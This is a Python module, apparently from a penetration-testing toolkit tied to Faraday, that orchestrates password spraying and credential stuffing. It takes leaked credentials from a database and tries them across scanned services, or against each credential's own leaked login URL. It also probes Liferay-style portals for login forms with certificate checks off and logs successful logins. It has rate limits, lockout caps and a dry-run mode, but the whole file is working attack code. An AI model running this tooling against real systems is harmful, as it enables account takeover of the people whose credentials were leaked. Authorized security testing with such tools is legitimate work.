"""Password-spray orchestrator with rate limiting and safety controls.

This module owns the policy logic that the executor delegates to:
- Per-username attempt cap (lockout protection)
- Inter-attempt delay
- Total attempt budget
- Excluded usernames
- Bounded thread pool concurrency
- Dry-run mode

It does NOT know anything about Faraday output formatting; that lives in the
executor entry point.
"""

from __future__ import annotations

import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Any, Optional, Set

import requests

from .credential_validator import validate, _LoginFormParser
from .faraday_workspace import WorkspaceTarget


@dataclass
class PasswordSprayPolicy:
    """Safety controls applied to every spray run."""
    max_attempts_per_user: int = 3
    delay_ms: int = 1000
    timeout_s: float = 5.0
    max_total_attempts: int = 1000
    concurrency: int = 5
    excluded_users: Set[str] = field(default_factory=set)
    dry_run: bool = False

    def normalize_excluded(self) -> Set[str]:
        return {u.strip().lower() for u in self.excluded_users if u and u.strip()}


@dataclass
class PasswordSprayAttempt:
    """A single (target, credential) attempt result."""
    host: str
    port: int
    protocol: str
    service_name: str
    username: str
    password_preview: str
    success: bool
    detail: str
    skipped: bool = False
    skip_reason: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class PasswordSprayJob:
    """A pending validation: pair a credential with a workspace target."""
    target: WorkspaceTarget
    username: str
    password: str

    @property
    def password_preview(self) -> str:
        if not self.password:
            return ""
        if len(self.password) <= 2:
            return "*" * len(self.password)
        return self.password[0] + "*" * (len(self.password) - 2) + self.password[-1]


def _credential_username(cred: Dict[str, Any]) -> str:
    """Pick the best username from a ClickHouse credential row."""
    user = (cred.get("user") or "").strip()
    if user:
        return user
    mail_user = cred.get("mail_username", "")
    mail_domain = cred.get("mail_domain", "")
    mail_tld = cred.get("mail_tld", "")
    if mail_user and mail_domain:
        return f"{mail_user}@{mail_domain}.{mail_tld}".strip(".")
    return ""


def _credential_password(cred: Dict[str, Any]) -> str:
    return cred.get("password") or ""


def _local_part(username: str) -> str:
    """For email-style usernames, also try the local part (before @)."""
    if "@" in username:
        return username.split("@", 1)[0]
    return username


def build_jobs(
    credentials: List[Dict[str, Any]],
    targets: List[WorkspaceTarget],
    policy: PasswordSprayPolicy,
    log,
) -> List[PasswordSprayJob]:
    """Cross-product credentials with targets, then apply safety filtering.

    Each unique (username, password) pair is exploded across every target.
    For email-style usernames we ALSO try the local part on non-mail services.
    """
    excluded = policy.normalize_excluded()

    seen_pairs: Set = set()
    pairs: List = []
    for cred in credentials:
        username = _credential_username(cred)
        password = _credential_password(cred)
        if not username or not password:
            continue
        if username.lower() in excluded:
            continue
        key = (username.lower(), password)
        if key in seen_pairs:
            continue
        seen_pairs.add(key)
        pairs.append((username, password))

    log(f"[BAGRE-PASSWORD-SPRAY] {len(pairs)} unique (user,pass) pairs after dedup/exclusion")

    per_user_attempts: Dict[str, int] = {}
    jobs: List[PasswordSprayJob] = []
    mail_protocols = {"smtp", "imap", "pop3"}

    for target in targets:
        for username, password in pairs:
            candidates = [username]
            if "@" in username and target.normalized_protocol not in mail_protocols:
                candidates.append(_local_part(username))

            for candidate_user in candidates:
                if candidate_user.lower() in excluded:
                    continue
                count = per_user_attempts.get(candidate_user.lower(), 0)
                if count >= policy.max_attempts_per_user:
                    continue
                if len(jobs) >= policy.max_total_attempts:
                    log(
                        f"[BAGRE-PASSWORD-SPRAY] hit max_total_attempts={policy.max_total_attempts}, "
                        f"truncating remaining jobs"
                    )
                    return jobs
                per_user_attempts[candidate_user.lower()] = count + 1
                jobs.append(PasswordSprayJob(target=target, username=candidate_user, password=password))

    return jobs


def _reconstruct_url(cred: Dict[str, Any]) -> str:
    """Rebuild the endpoint URL from a credential row's URL components."""
    proto = (cred.get("uri_protocol") or "https") or "https"
    sub = cred.get("uri_subdomain") or ""
    dom = cred.get("uri_domain") or ""
    tld = cred.get("uri_tld") or ""
    host = ".".join(p for p in [sub, dom, tld] if p)
    if not host:
        return ""
    port = cred.get("uri_port") or 0
    path = cred.get("uri_path") or ""
    url = f"{proto}://{host}"
    if port and int(port) not in (0, 80, 443):
        url += f":{port}"
    url += path
    return url


def build_endpoint_jobs(
    credentials: List[Dict[str, Any]],
    policy: PasswordSprayPolicy,
    log,
    form_login: bool = True,
) -> List[PasswordSprayJob]:
    """Build 1:1 jobs validating each credential against its OWN leaked
    endpoint URL (no workspace services required, no cross-product).

    Used when the workspace has no scanned services. For web endpoints the
    protocol is http-form / https-form so the form-login validator runs.
    """
    excluded = policy.normalize_excluded()
    per_user: Dict[str, int] = {}
    jobs: List[PasswordSprayJob] = []
    seen: Set = set()

    for cred in credentials:
        username = _credential_username(cred)
        password = _credential_password(cred)
        if not username or not password:
            continue
        if username.lower() in excluded:
            continue
        url = _reconstruct_url(cred)
        if not url:
            continue
        key = (username.lower(), password, url)
        if key in seen:
            continue
        seen.add(key)

        count = per_user.get(username.lower(), 0)
        if count >= policy.max_attempts_per_user:
            continue
        if len(jobs) >= policy.max_total_attempts:
            log(f"[BAGRE-PASSWORD-SPRAY] hit max_total_attempts={policy.max_total_attempts}; truncating")
            break
        per_user[username.lower()] = count + 1

        proto = (cred.get("uri_protocol") or "https").lower()
        norm = "https-form" if (form_login and proto == "https") else ("http-form" if form_login else proto)
        host = ".".join(p for p in [cred.get("uri_subdomain") or "", cred.get("uri_domain") or "", cred.get("uri_tld") or ""] if p)
        target = WorkspaceTarget(
            host_id=0,
            ip=host,
            hostnames=[host] if host else [],
            port=int(cred.get("uri_port") or 0),
            protocol="tcp",
            service_name=proto,
            normalized_protocol=norm,
            url=url,
        )
        jobs.append(PasswordSprayJob(target=target, username=username, password=password))

    log(f"[BAGRE-PASSWORD-SPRAY] built {len(jobs)} endpoint jobs (1:1 cred→its own URL, form_login={form_login})")
    return jobs


_FORM_PROTOS = ("http-form", "https-form")


def _probe_login_endpoint(host: str, timeout_s: float) -> Optional[str]:
    """Find the canonical Liferay-style login URL for a host.

    Probes https first (the portals only really listen on https; the leaked
    URLs are often plaintext-http even when the live site is https-only),
    then http as a fallback. Returns the first response URL whose body
    contains a ``<input type=password>`` form — that's the canonical login
    page we'll route every spray attempt against. Returns ``None`` if no
    candidate served a login form.
    """
    candidates = [
        f"https://{host}/c/portal/login",
        f"https://{host}/web/guest/home",
        f"https://{host}/",
        f"http://{host}/c/portal/login",
        f"http://{host}/",
    ]
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (bagre-spray)"})
    for url in candidates:
        try:
            r = session.get(url, timeout=timeout_s, verify=False, allow_redirects=True)
        except requests.exceptions.RequestException:
            continue
        parser = _LoginFormParser()
        try:
            parser.feed(r.text)
        except Exception:
            continue
        if parser.login_form():
            # Use the final URL after redirects — that's the canonical form
            # location, not the request entry point.
            return r.url
    return None


def discover_login_endpoints(
    jobs: List[PasswordSprayJob],
    timeout_s: float,
    log,
) -> Dict[str, Optional[str]]:
    """For each unique host across the form-login jobs, find the working
    login URL once and rewrite every job for that host to use it.

    Liferay portals reject `http://` and the per-cred leaked URL is often a
    deep path that 404s — without this step ~44% of attempts never reach a
    real login form. We trade one extra HTTPS GET per host for ~80 more
    real auth attempts.

    Jobs whose protocol is not http-form/https-form pass through unchanged.
    Hosts where no candidate yielded a form keep their per-cred URL (so we
    still get diagnostic misses rather than silently dropping them).

    Returns a ``{host: discovered_url_or_None}`` map so the caller can
    surface the canonical login URL in the run report / vulnerabilities.
    """
    discovered: Dict[str, Optional[str]] = {}
    if not jobs:
        return discovered

    hosts: Dict[str, List[PasswordSprayJob]] = {}
    for j in jobs:
        if j.target.normalized_protocol not in _FORM_PROTOS:
            continue
        h = (j.target.display_host or j.target.ip or "").strip().lower()
        if not h:
            continue
        hosts.setdefault(h, []).append(j)

    if not hosts:
        return discovered

    log(f"[BAGRE-PASSWORD-SPRAY] discovering login endpoints for {len(hosts)} unique form-login host(s)")
    for host, host_jobs in hosts.items():
        url = _probe_login_endpoint(host, timeout_s=max(timeout_s, 10.0))
        discovered[host] = url
        if not url:
            log(
                f"[BAGRE-PASSWORD-SPRAY] no working login form found for {host} "
                f"(probed https + http portal/web-guest/root); {len(host_jobs)} jobs keep their per-cred URLs"
            )
            continue
        log(
            f"[BAGRE-PASSWORD-SPRAY] discovered login endpoint for {host}: {url} "
            f"(routing {len(host_jobs)} jobs through this URL)"
        )
        forced_proto = "https-form" if url.lower().startswith("https://") else "http-form"
        for j in host_jobs:
            j.target.url = url
            j.target.normalized_protocol = forced_proto

    return discovered


def _run_single(job: PasswordSprayJob, policy: PasswordSprayPolicy) -> PasswordSprayAttempt:
    target = job.target
    host = target.display_host
    if policy.dry_run:
        return PasswordSprayAttempt(
            host=host,
            port=target.port,
            protocol=target.normalized_protocol,
            service_name=target.service_name,
            username=job.username,
            password_preview=job.password_preview,
            success=False,
            detail=f"dry-run: not attempted (url={target.url or host})",
            skipped=True,
            skip_reason="dry-run",
        )

    success, detail = validate(
        protocol=target.normalized_protocol,
        host=host,
        port=target.port,
        username=job.username,
        password=job.password,
        timeout=policy.timeout_s,
        url=target.url or None,
    )
    return PasswordSprayAttempt(
        host=host,
        port=target.port,
        protocol=target.normalized_protocol,
        service_name=target.service_name,
        username=job.username,
        password_preview=job.password_preview,
        success=success,
        detail=detail,
    )


def run_password_spray(jobs: List[PasswordSprayJob], policy: PasswordSprayPolicy, log) -> List[PasswordSprayAttempt]:
    """Execute all jobs with bounded concurrency and an inter-attempt delay.

    The delay is global (between dispatches) — not per-thread — to bound
    total request rate across the whole run.
    """
    if not jobs:
        return []

    results: List[PasswordSprayAttempt] = []
    delay_s = max(0.0, policy.delay_ms / 1000.0)
    dispatch_lock = threading.Lock()
    last_dispatch = [0.0]

    def gate_and_run(job: PasswordSprayJob) -> PasswordSprayAttempt:
        with dispatch_lock:
            now = time.monotonic()
            wait = (last_dispatch[0] + delay_s) - now
            if wait > 0:
                time.sleep(wait)
            last_dispatch[0] = time.monotonic()
        return _run_single(job, policy)

    log(
        f"[BAGRE-PASSWORD-SPRAY] dispatching {len(jobs)} attempts "
        f"(concurrency={policy.concurrency}, delay_ms={policy.delay_ms}, "
        f"timeout_s={policy.timeout_s}, dry_run={policy.dry_run})"
    )

    with ThreadPoolExecutor(max_workers=max(1, policy.concurrency)) as pool:
        futures = [pool.submit(gate_and_run, job) for job in jobs]
        for future in as_completed(futures):
            try:
                attempt = future.result()
            except Exception as e:
                attempt = PasswordSprayAttempt(
                    host="?",
                    port=0,
                    protocol="?",
                    service_name="?",
                    username="?",
                    password_preview="?",
                    success=False,
                    detail=f"unexpected error: {e}",
                )
            results.append(attempt)
            if attempt.success:
                log(
                    f"[BAGRE-PASSWORD-SPRAY] HIT {attempt.protocol}://{attempt.host} "
                    f"as {attempt.username} — {attempt.detail}"
                )
            elif not attempt.skipped:
                # Log every non-skipped verdict so the dispatcher shows WHY a
                # credential failed (dead password vs no-form vs inconclusive).
                log(
                    f"[BAGRE-PASSWORD-SPRAY] miss {attempt.protocol}://{attempt.host} "
                    f"as {attempt.username} — {attempt.detail}"
                )

    return results
